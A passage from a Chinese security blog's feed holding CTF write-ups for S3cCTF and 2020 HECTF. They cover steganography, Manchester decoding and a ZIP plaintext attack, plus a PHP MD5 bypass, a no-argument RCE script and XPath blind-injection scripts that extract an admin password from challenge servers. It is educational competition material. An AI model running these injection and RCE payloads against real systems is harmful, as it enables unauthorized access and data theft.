id="4-S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？"><a href="#4-S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？" class="headerlink" title="4. S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？"></a>4. S3C战队代表学校在第十三届全国大学生信息安全创新实践能力赛总决赛上取得了多少名的成绩？</h4><p>33<br>招新PPT上写的，学校公众号也能查到</p><h4 id="5-截至目前最新的C语言标准是C多少？"><a href="#5-截至目前最新的C语言标准是C多少？" class="headerlink" title="5. 截至目前最新的C语言标准是C多少？"></a>5. 截至目前最新的C语言标准是C多少？</h4><p>18<br>C标准以年号结尾命名，有人问为什么不是C99,C11….我只能说，现在最新的是C18，百度好好查查吧…（2年了）</p><p>全部答对给flag，不行爆破也行</p><hr><h2 id="myid"><a href="#myid" class="headerlink" title="myid"></a>myid</h2><h3 id="出题解析-9"><a href="#出题解析-9" class="headerlink" title="出题解析"></a>出题解析</h3><p>社工大佬，怕了怕了</p><h3 id="解题方式-9"><a href="#解题方式-9" class="headerlink" title="解题方式"></a>解题方式</h3><p>原本考爆破的，后来干脆直接你们社工算了…</p><img src="/article/S3cCTF-gyy-Writeup/20201122203410982.png" class="" title="id" loading="lazy"><p>打开去掉disable标签</p><img src="/article/S3cCTF-gyy-Writeup/2020112220344579.png" class="" title="id" loading="lazy"><p>下面提示</p><img src="/article/S3cCTF-gyy-Writeup/20201122203500307.png" class="" title="id" loading="lazy"><p>原来想考爆破，最后都知道了…id是我学号，直接开始社工，索性改分类为MISC。<br>再给个hint：<code>计算机院 2019 懂？</code><br>首先2019级即前5位为<code>12019</code><br>计算机院为050-055(大概）<br>所以前八位<code>1201905x</code>，爆破一下就好了。<br>当然也有问学长学姐的，问墙的，翻我空间的，查学校名册的，都可以。这题就当玩玩233333<br>ID:12019054018</p><img src="/article/S3cCTF-gyy-Writeup/20201122203854684.png" class="" title="id" loading="lazy"><hr><h2 id="flag-jpg"><a href="#flag-jpg" class="headerlink" title="flag.jpg"></a>flag.jpg</h2><h3 id="出题解析-10"><a href="#出题解析-10" class="headerlink" title="出题解析"></a>出题解析</h3><p>考察工具利用以及查看属性</p><h3 id="解题方式-10"><a href="#解题方式-10" class="headerlink" title="解题方式"></a>解题方式</h3><p>小戈:give me a flag 一看属性竟然用 SteganPEG 而且还没那么简单</p><p>提示很明显，用软件 SteganPEG ，密码就是<code>givemeaflag</code>（生怕你们看不见），其实正规地方在文件的属性里</p><img src="/article/S3cCTF-gyy-Writeup/20201122204149398.png" class="" title="flag" loading="lazy"><p>软件读文件</p><img src="/article/S3cCTF-gyy-Writeup/20201122204353880.png" class="" title="flag" loading="lazy"><p>拖出来打开就是flag</p><hr><h2 id="Manchester"><a href="#Manchester" class="headerlink" title="Manchester"></a>Manchester</h2><h3 id="出题解析-11"><a href="#出题解析-11" class="headerlink" title="出题解析"></a>出题解析</h3><p>考察 学习理解能力 百度曼彻斯特编码</p><h3 id="解题方式-11"><a href="#解题方式-11" class="headerlink" title="解题方式"></a>解题方式</h3><p>大白话解释：低电平是0，高电平是1。<br>曼彻斯特编码<code>01-&gt;1</code> <code>10-&gt;0</code><br>当时出这题用的C写的，蹩脚的东西看看就好…</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> a1<span class="token punctuation">,</span>a2<span class="token punctuation">;</span><span class="token keyword">do</span><span class="token punctuation">&#123;</span>a1<span class="token operator">=</span><span class="token function">fgetc</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>a2<span class="token operator">=</span><span class="token function">fgetc</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a1<span class="token operator">==</span><span class="token string">'0'</span><span class="token operator">&amp;&amp;</span>a2<span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a1<span class="token operator">==</span><span class="token string">'1'</span><span class="token operator">&amp;&amp;</span>a2<span class="token operator">==</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span>a1<span class="token operator">&amp;&amp;</span>a2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">putchar</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> </code></pre><p>得到<code>011100110011001101100011011110110100110101100001011011100100001101101000010001010111001101110100011001010111001001011111011101110011000101110100011010000101111100110000001100010011000001111101</code><br>复制去二进制转字符，直接出答案</p><img src="/article/S3cCTF-gyy-Writeup/2020112220515011.png" class="" title="man" loading="lazy"><hr><h2 id="SlientEye"><a href="#SlientEye" class="headerlink" title="SlientEye"></a>SlientEye</h2><h3 id="出题解析-12"><a href="#出题解析-12" class="headerlink" title="出题解析"></a>出题解析</h3><p>水题，考察知识面，和搜索…</p><h3 id="解题方式-12"><a href="#解题方式-12" class="headerlink" title="解题方式"></a>解题方式</h3><p>真的水题，搜索标题<code>SlientEye</code>，是的，这是个软件<br>默认设置解密，直接出答案</p><img src="/article/S3cCTF-gyy-Writeup/20201122205451153.png" class="" title="slient" loading="lazy"><hr><h2 id="Plaintext"><a href="#Plaintext" class="headerlink" title="Plaintext"></a>Plaintext</h2><h3 id="出题解析-13"><a href="#出题解析-13" class="headerlink" title="出题解析"></a>出题解析</h3><p>写的很清楚，明文攻击<br>给了hint，暗示伪加密<br>开赛题坚持了这么久我没想到…</p><h3 id="解题方式-13"><a href="#解题方式-13" class="headerlink" title="解题方式"></a>解题方式</h3><p>打开发现压缩包三文件全加密，压缩包里的注释</p><pre class="language-none"><code class="language-none">亲眼所见，亦非真实也许是虚伪的，也许需要AZPR</code></pre><p>明示软件AZPR，这是个爆破软件<br>伪加密百度有一篇很详细的文章<br>修改加密位为<code>00</code>，不知道哪个文件是伪加密直接所有加密位为<code>00</code></p><img src="/article/S3cCTF-gyy-Writeup/20201122210335385.png" class="" width="00" loading="lazy"><p>保存后解压只有副本那个文件可以保存，其他两个文件是真加密</p><img src="/article/S3cCTF-gyy-Writeup/20201122210502282.png" class="" width="00" loading="lazy"><p>根据明文攻击方法，将这个文件打包zip然后去题目再下一遍原文件,此时文件被修改，也可以改回去</p><p>用AZPR选择明文攻击即可</p><img src="/article/S3cCTF-gyy-Writeup/20201122210917960.png" class="" title="在这里插入图片描述" loading="lazy"><p>可以看到密钥被恢复了，不用找密码了，直接可以保存</p><img src="/article/S3cCTF-gyy-Writeup/20201122211504935.png" class="" title="在这里插入图片描述" loading="lazy"><p>保存文件，其实已经破解出来了</p><img src="/article/S3cCTF-gyy-Writeup/20201122210823677.png" class="" title="在这里插入图片描述" loading="lazy"><p>或者用rbkcrack也可以<br>直接打开flag.txt得flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;S3cCTF-gyy-Writeup&quot;&gt;&lt;a href=&quot;#S3cCTF-gyy-Writeup&quot; class=&quot;headerlink&quot; title=&quot;S3cCTF-gyy-Writeup&quot;&gt;&lt;/a&gt;S3cCTF-gyy-Writeup&lt;/h1&gt;&lt;p&gt;&lt;stron</summary>
      
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="PHP" scheme="https://err0r.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>2020 HECTF Write-up</title>
    <link href="https://err0r.top/article/2020-HECTF-Write-up/"/>
    <id>https://err0r.top/article/2020-HECTF-Write-up/</id>
    <published>2020-11-22T14:00:00.000Z</published>
    <updated>2021-03-30T11:58:46.106Z</updated>
    
    <content type="html"><![CDATA[<h3 id="by-gyy"><a href="#by-gyy" class="headerlink" title="by:gyy"></a>by:gyy</h3><p>抢了到人生第一次大一点点比赛的一血</p><img src="/article/2020-HECTF-Write-up/1.png" class="" title="first" loading="lazy"><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>题目链接：<a href="http://121.196.32.184:12001/">http://121.196.32.184:12001/</a></p><p>打开发现<code>nonono ，once again！</code></p><p>查看源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"You need the file is xxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"nonono ，once again！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>flag不在<span class="token operator">/</span>flag中哦，你应该找找奇奇怪怪的文件名<span class="token operator">--</span><span class="token operator">></span></code></pre><p><code>$_POST[&#39;a&#39;] !== $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])</code><br>老MD5强类型比较，传入两个数组，数组的值不相等，造成MD5加密时报错产生NULL=NULL的情况，绕过比较。<br>即<code>a[]=1&amp;b[]=a</code></p><img src="/article/2020-HECTF-Write-up/image-20201129160030053.png" class="" title="image-20201129160030053" loading="lazy"><p>访问./3b8cf4731c36d20776c76e20f9c774c7.php</p><pre class="language-php" data-language="php"><code class="language-php">@<span class="token variable">$data</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">!=</span><span class="token double-quoted-string string">"/xxx"</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token single-quoted-string string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"great!!!!你需要看看源码"</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token double-quoted-string string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么<span class="token punctuation">,</span>记得加上绝对路径</code></pre><p>第一反应猜文件，爆破半天出不来<br>然后去扫目录，发现了/etc等目录，后来比赛方给了hint，<code>/etc/crontab</code></p><p>``./../../../etc/crontab`访问得</p><pre class="language-none"><code class="language-none"># &#x2F;etc&#x2F;crontab: system-wide crontab# Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;# command to install the new version when you edit this file# and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,# that none of the other crontabs do.SHELL&#x3D;&#x2F;bin&#x2F;shPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin# Example of job definition:# .---------------- minute (0 - 59)# |  .------------- hour (0 - 23)# |  |  .---------- day of month (1 - 31)# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...# |  |  |  |  .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat# |  |  |  |  |# *  *  *  *  * user-name command to be executed17 ** * *root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly25 6* * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )47 6* * 7roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )52 61 * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )#0 17 2 8 * &#x2F;bin&#x2F;php &#x2F;very_g00d_Y0u_got_it.php</code></pre><p>很明显<code>/very_g00d_Y0u_got_it.php</code></p><p>访问得啥都没有，因为我们没写东西进去。<br>然后回上一步分析源码，<br><code>&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $data)</code><br>从data参数中匹配字母、数字、下划线，其实就是’\w+’，然后在匹配一个循环的’()’，将匹配的替换为NULL，判断剩下的是否只有’;’。</p><p>很明显无参数RCE，编写脚本，首先<code>print_r(getcwd());</code></p><img src="/article/2020-HECTF-Write-up/image-20201129160247187.png" class="" title="image-20201129160247187" loading="lazy"><p>访问<code>/very_g00d_Y0u_got_it.php</code>得<code>/</code>，说明当前工作目录为根目录</p><img src="/article/2020-HECTF-Write-up/image-20201129160318943.png" class="" title="image-20201129160318943" loading="lazy"><p>然后<code>print_r(scandir(getcwd()));</code>扫一下目录</p><pre class="language-none"><code class="language-none">Array(    [0] &#x3D;&gt; .    [1] &#x3D;&gt; ..    [2] &#x3D;&gt; .dockerenv    [3] &#x3D;&gt; 3b8cf4731c36d20776c76e20f9c774c7.php    [4] &#x3D;&gt; Zmw0Z2dnZ2dnZ2dnZ2dnCg    [5] &#x3D;&gt; bin    [6] &#x3D;&gt; boot    [7] &#x3D;&gt; dev    [8] &#x3D;&gt; etc    [9] &#x3D;&gt; flag    [10] &#x3D;&gt; home    [11] &#x3D;&gt; index.php    [12] &#x3D;&gt; lib    [13] &#x3D;&gt; lib64    [14] &#x3D;&gt; media    [15] &#x3D;&gt; mnt    [16] &#x3D;&gt; opt    [17] &#x3D;&gt; proc    [18] &#x3D;&gt; root    [19] &#x3D;&gt; run    [20] &#x3D;&gt; sbin    [21] &#x3D;&gt; srv    [22] &#x3D;&gt; start.sh    [23] &#x3D;&gt; sys    [24] &#x3D;&gt; tmp    [25] &#x3D;&gt; usr    [26] &#x3D;&gt; var    [27] &#x3D;&gt; very_g00d_Y0u_got_it.php)</code></pre><img src="/article/2020-HECTF-Write-up/image-20201129160403000.png" class="" title="image-20201129160403000" loading="lazy"><p>发现异常文件<code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code>，访问后得到了flag</p><img src="/article/2020-HECTF-Write-up/image-20201129160434419.png" class="" title="image-20201129160434419" loading="lazy"><p>最后base64一下发现<code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code>就是<code>fl4gggggggggggg</code></p><p>Payload：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://121.196.32.184:12001"</span>url1 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/3b8cf4731c36d20776c76e20f9c774c7.php"</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"data"</span> <span class="token punctuation">:</span> <span class="token string">"print_r(scandir(getcwd()));"</span><span class="token punctuation">,</span>    <span class="token string">"file"</span> <span class="token punctuation">:</span> <span class="token string">"/very_g00d_Y0u_got_it.php"</span><span class="token punctuation">&#125;</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1 <span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>url2 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/very_g00d_Y0u_got_it.php"</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span></code></pre><h3 id="injection"><a href="#injection" class="headerlink" title="injection"></a>injection</h3><p>题目链接：<a href="http://114.55.165.246:8082/">http://114.55.165.246:8082/</a></p><p>题目提示为注入，进入界面为登陆框，第一时间想到SQL注入</p><img src="/article/2020-HECTF-Write-up/image-20201129160533941.png" class="" title="image-20201129160533941" loading="lazy"><p>输admin登陆一下</p><img src="/article/2020-HECTF-Write-up/image-20201129160554397.png" class="" title="image-20201129160554397" loading="lazy"><p>是GET传参，sqlmap跑一下没有结果，万能密码<code>1&#39;or 1=1</code>试一下成功</p><img src="/article/2020-HECTF-Write-up/image-20201129160625642.png" class="" title="image-20201129160625642" loading="lazy"><p>怀疑是XXE，尝试了一会发现不是。<br>后来想到XPath注入(傻了，报错里有…)</p><p>XPath基础查询语句<code>//users/user[loginID/text()=’abc’ and password/text()=’test123’]</code></p><p>这是一个XPath查询语句，获取loginID为abc的所有user数据，用户需要提交正确的loginID和password才能返回结果。如果黑客在 loginID 字段中输入：’ or 1=1 并在 password 中输入：’ or 1=1   就能绕过校验，成功获取所有user数据</p><p><code>//users/user[LoginID/text()=&#39;&#39;or 1=1 and password/text()=&#39;&#39;or 1=1]</code></p><p>具体不做阐述</p><hr><p><strong>尝试XPath盲注</strong></p><p>一般步骤如下:</p><p>1.判断根下节点数:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or count(/*)=1 or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>result: 1</p><p>2.猜解第一级节点:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/*[position()=1]),1,1)=&#39;r&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/*[position()=1]),2,1)=&#39;o&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>…</p><p>result: root</p><p>3.判断root的下一级节点数:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or count(/root/*)=2 or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>result: 2</p><p>4.猜解root的下一级节点:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/root/*[position()=1]),1,1)=&#39;u&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/root/*[position()=2]),1,1)=&#39;s&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>result: users,secret</p><p>重复上述步骤,直到猜解出所有节点.最后来猜解节点中的数据或属性值.</p><p>猜解id为1的user节点下的username值,</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(/root/users/user[id=1]/username,1,1)=&#39;a&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>…</p><p>result: admin</p><hr><p>写脚本开始跑<br>首先判断根下节点数<br>因为是GET传参，直接访问<code>http://114.55.165.246:8082/?username=1&#39; or count(/*)=1 or &#39;1&#39;=&#39;1&amp;password=1&amp;submit=登录</code></p><img src="/article/2020-HECTF-Write-up/image-20201129160726706.png" class="" title="image-20201129160726706" loading="lazy"><p>这个结果应该是return 1，即根下有一个节点</p><p>如果换成<code>...username=1&#39; or count(/*)=2 or &#39;1&#39;=&#39;1...</code>则会返回登录失败，即结果为return 0.</p><p>继续猜测第一级节点，用脚本跑</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> rebaseurl <span class="token operator">=</span> <span class="token string">"http://114.55.165.246:8082/?username="</span>s <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnm1234567890"</span>result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"1' or substring(name(/!XXXX!*[position()=1]),"</span>        payload <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        payload <span class="token operator">+=</span> <span class="token string">",1)='"</span>        payload <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        payload <span class="token operator">+=</span> <span class="token string">"' or '1'='1"</span>        end <span class="token operator">=</span> <span class="token string">"&amp;password=admin&amp;submit=登录"</span>        url <span class="token operator">=</span> baseurl <span class="token operator">+</span> payload <span class="token operator">+</span> end        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"you"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            flag<span class="token operator">=</span><span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"--------->"</span> <span class="token operator">+</span> res<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r\n"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment"># !####! 换成目录即可</span></code></pre><p>结果爆出第一级为root</p><img src="/article/2020-HECTF-Write-up/image-20201129161139719.png" class="" title="image-20201129161139719" loading="lazy"><p>同理，修改第13行为<code>&quot;1&#39; or substring(name(/root/*[position()=1]),&quot;</code><br>继续爆</p><img src="/article/2020-HECTF-Write-up/image-20201129161225253.png" class="" title="image-20201129161225253" loading="lazy"><img src="/article/2020-HECTF-Write-up/image-20201129161255235.png" class="" title="image-20201129161255235" loading="lazy"><img src="/article/2020-HECTF-Write-up/image-20201129161318627.png" class="" title="image-20201129161318627" loading="lazy"><p>最后爆出结构为/root/users/user[id]</p><p>开始猜测id为1的user节点下username值，其实能猜到的admin</p><p>payload：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> rebaseurl <span class="token operator">=</span> <span class="token string">"http://114.55.165.246:8082/?username="</span>s <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnm1234567890"</span>result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"1' or substring(/root/users/user[id=1]/username,"</span>        payload <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        payload <span class="token operator">+=</span> <span class="token string">",1)='"</span>        payload <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        payload <span class="token operator">+=</span> <span class="token string">"' or '1'='1"</span>        end <span class="token operator">=</span> <span class="token string">"&amp;password=admin&amp;submit=登录"</span>        url <span class="token operator">=</span> baseurl <span class="token operator">+</span> payload <span class="token operator">+</span> end        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"you"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            flag <span class="token operator">=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"位----------->"</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment"># 爆密码就把username改成password</span></code></pre><p>爆username</p><img src="/article/2020-HECTF-Write-up/image-20201129162416104.png" class="" title="image-20201129162416104" loading="lazy"><p>果然是admin</p><p>继续爆password</p><img src="/article/2020-HECTF-Write-up/image-20201129161907953.png" class="" title="image-20201129161907953" loading="lazy"><p>结果password=339db714647a1d66b85cd08442287841</p><p>登录一下，获得flag</p><img src="/article/2020-HECTF-Write-up/image-20201129161946397.png" class="" title="image-20201129161946397" loading="lazy">]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;by-gyy&quot;&gt;&lt;a href=&quot;#by-gyy&quot; class=&quot;headerlink&quot; title=&quot;by:gyy&quot;&gt;&lt;/a&gt;by:gyy&lt;/h3&gt;&lt;p&gt;抢了到人生第一次大一点点比赛的一血&lt;/p&gt;
&lt;img src=&quot;/article/2020-HECTF-Wr</summary>
      
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="SQL" scheme="https://err0r.top/tags/SQL/"/>
    
    <category term="PHP" scheme="https://err0r.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>2020hxb-Writeup</title>
    <link href="https://err0r.top/article/2020hxb-Writeup-cOMING/"/>
